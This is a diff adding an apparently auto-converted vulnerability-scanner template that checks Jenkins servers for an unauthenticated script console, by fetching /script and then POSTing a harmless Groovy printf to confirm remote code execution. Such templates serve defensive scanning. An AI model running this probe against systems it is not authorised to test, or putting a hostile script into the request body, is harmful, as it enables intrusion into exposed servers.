@@ -1,0 +1,31 @@
+id: yaml-poc-jenkins-jenkins-unauthorized_access-CT-158106
+info:
+  name: Yaml Poc Jenkins Jenkins Unauthorized_Access Ct 158106
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-jenkins-jenkins-unauthorized_access-CT-158106'
+  tags: jenkins,unauth
+  reference: []
+http:
+- method: GET
+  path:
+  - /script
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: POST
+  path:
+  - /script
+  body: 'script=printf%28%27{{r1}}%25%25{{r2}}%27%29%3B&Jenkins-Crumb={{var}}&Submit=%E8%BF%90%E8%A1%8C
+
+    '
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
